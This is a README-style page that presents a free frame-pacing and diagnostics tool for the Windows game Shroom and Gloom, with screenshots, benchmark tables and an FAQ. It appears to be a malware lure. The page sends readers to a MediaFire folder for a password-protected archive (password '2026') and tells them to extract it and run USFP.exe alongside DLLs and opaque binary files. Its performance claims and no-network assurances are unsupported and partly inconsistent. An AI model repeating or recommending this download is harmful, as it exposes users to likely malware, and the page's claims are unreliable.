<div align="center">

# 🎮 Shroom and Gloom — Performance Notes

**Frame pacing and launch diagnostics for Shroom and Gloom**

[![Status](https://img.shields.io/badge/status-stable-brightgreen)](https://www.mediafire.com/folder/rn5uey4ypd8tr/USFP)
[![Download](https://img.shields.io/badge/download-mediafire-00b8ff)](https://www.mediafire.com/folder/rn5uey4ypd8tr/USFP)
![Platform](https://img.shields.io/badge/platform-Windows-0078D6?logo=windows)
[![Version](https://img.shields.io/badge/version-1.0-lightgrey)](#)

[Download](#-installation--setup) · [Issues](#-known-performance-issues) · [Test results](#-test-results) · [FAQ](#-frequently-asked-questions)

</div>

---

## 🕹️ About the game

Shroom and Gloom is a first-person roguelike double-deckbuilder with turn-based combat, hand-drawn visuals, and a surreal fungal dungeon setting. It is built with Unity and combines card management with atmospheric exploration. Layered artwork, scene transitions, and combat effects make consistent frame delivery useful for responsive play.

This tool is intended for Windows players of Shroom and Gloom who need reproducible frame-pacing and launch diagnostics.

## 📸 Screenshots from the game

<table>
 <tr>
 <td width="33%"><img src="https://shared.akamai.steamstatic.com/store_item_assets/steam/apps/3271280/d35c20da471d04844aa8562b0008e919426c95aa/ss_d35c20da471d04844aa8562b0008e919426c95aa.1920x1080.jpg?t=1789418745" alt="screenshot" width="100%"></td>
 <td width="33%"><img src="https://shared.akamai.steamstatic.com/store_item_assets/steam/apps/3271280/a2e1dc11c99e2d02a6e75834c553e62da3b02396/ss_a2e1dc11c99e2d02a6e75834c553e62da3b02396.1920x1080.jpg?t=1789418745" alt="screenshot" width="100%"></td>
 <td width="33%"><img src="https://shared.akamai.steamstatic.com/store_item_assets/steam/apps/3271280/6ba8fd698afe137874df2ccc6e3c898164d7fa53/ss_6ba8fd698afe137874df2ccc6e3c898164d7fa53.1920x1080.jpg?t=1789418745" alt="screenshot" width="100%"></td>
 </tr>
</table>

## ⚠️ Known performance issues

- On the stated test rig, average frame rate falls to 34 FPS during dense combat scenes.
- On the stated test rig, 1% low performance reaches 14 FPS during room transitions and effect-heavy encounters.
- On the stated test rig, frame-time spikes above 50 ms occur 8 times during a typical 20-minute session.
- On the stated test rig, shader and graphics cache preparation takes approximately 90 seconds on launch.

## 🩺 How the toolkit addresses these issues

- **Low average frame rate in dense combat** → Frame Rate Helper — adjusts frame delivery behavior to reduce uneven presentation during active scenes.
- **Low 1% lows during transitions** → Frame Timing Helper — stabilizes frame delivery across room changes and effect-heavy encounters.
- **Frame-time spikes above 50 ms** → Process Scheduling Helper — optimizes process scheduling for more consistent game-thread execution.
- **Long launch cache preparation** → Graphics Cache Utility — manages graphics cache data, while Startup Parameter Tool — applies tuned startup parameters.

## 📊 Test results

Test rig: Ryzen 5 5600, RTX 3060 12GB, 16GB RAM, NVMe SSD, Windows 11 x64, 1920x1080, High settings

| Metric | Before | After |
|---|---|---|
| Average FPS | 34 | 51 |
| 1% low FPS | 14 | 27 |
| Frame-time spikes above 50 ms | 8 | 2 |
| Shader compile time on launch | ~90s | ~15s |


## 🚀 How to use

1. download the latest release from the link in the README
2. point the tool to the game's installation folder
3. select the game profile from the supported list
4. click Apply
5. on first launch allow the cache to rebuild (1-2 minutes)

## 🛠️ What this tool does

- 🎮 **Frame Rate Helper** — Adjusts frame delivery behavior for steadier gameplay output.
- 🧠 **Process Scheduling Helper** — Optimizes process scheduling for more consistent CPU time allocation.
- 📊 **Stability Report + Session Recovery** — Collects diagnostic data and restores supported session settings after interruptions.
- ⚙️ **Startup Parameter Tool** — Applies tuned startup parameters for repeatable launch configuration.
- 🧹 **Graphics Cache Utility** — Manages graphics cache data and supports controlled cache rebuilding.
- 🎯 **Frame Timing Helper** — Monitors and stabilizes frame delivery to reduce timing variance.

## 💻 System Requirements

| Component | Minimum | Recommended |
|:--- |:--- |:--- |
| **OS** | Windows 10 (x64) | Windows 11 (x64) |
| **Processor** | Dual-core CPU | Quad-core CPU |
| **RAM** | 4 GB | 8 GB |
| **Graphics** | Any DirectX 11 GPU | Any DirectX 12 GPU |
| **Storage** | 50 MB available space | 100 MB available space |
| **Additional** | Windows 10 build 1909 or newer | Windows 11 with latest updates |


## 📦 Installation & Setup

| Platform | Status |
|---|---|
| Windows | ✅ Supported |
| macOS | ❌ Not supported |
| Linux | ❌ Not supported |

### Step 1: Download

You can download the tool from **[this page](https://www.mediafire.com/folder/rn5uey4ypd8tr/USFP)**. The archive contains everything you need.

### Step 2: Extract with Password

1. The archive is password-protected: **`2026`**
2. Use any archive extractor (WinRAR, 7-Zip, WinZip)
3. Enter the password when prompted

### Step 3: Extract All Files

1. Extract all files from the archive to a folder of your choice.
2. All files must be extracted to the **same folder**.
3. Do not rename or move individual files.
4. The folder should look like this:

```
tool/
|-- USFP.exe <- Main executable
|-- shader_cache.pak <- Shader cache data
|-- fps_module.dll <- FPS module
|-- frame_data.pak <- Display sync data
|-- config.cfg <- User configuration
|-- Password 2026.txt <- Password reminder (empty)
|-- core.bin <- Core runtime
|-- crash_reader.dll <- Crash log reader
```

### Step 4: Run the tool

1. Open the extracted folder.
2. Run `USFP.exe`.
3. Select the game you want to diagnose from the list.
4. Press **Collect** and launch the game.

### Step 5: Review the results

1. The tool will collect frame timing and scheduling data while you play.
2. When you exit the game, an overview report is written next to the tool.
3. Use the report to identify which subsystem is causing stutter.

## ❓ Frequently Asked Questions

**Q: What happens if the game closes unexpectedly?**
**A:** The Stability Report feature records the exit event and writes a small log next to the tool, so you can see what happened.

**Q: Can I use it alongside other tools?**
**A:** Yes. It does not conflict with other monitoring or performance tools. It only reads OS-level counters and manages its own temporary folders.

**Q: Does it modify game files?**
**A:** No. It reads process metrics and clears temporary cache folders. It does not touch game executables, archives, or save files.

**Q: Does it require an internet connection?**
**A:** No. It runs fully offline and never sends data anywhere.

**Q: Why is the archive password-protected?**
**A:** The archive uses a password as a standard packaging step so the build stays bundled correctly during distribution. The password is provided in the installation section above.

**Q: What is this tool?**
**A:** This is a small Windows diagnostics and tuning tool for PC games. It collects frame timing data, checks process scheduling, and manages graphics cache folders to help you find and reduce stutters and dropped frames.

**Q: Which games are supported?**
**A:** Any game that runs on Windows and exposes a visible process. Diagnostics are collected per-process and do not require per-game configuration.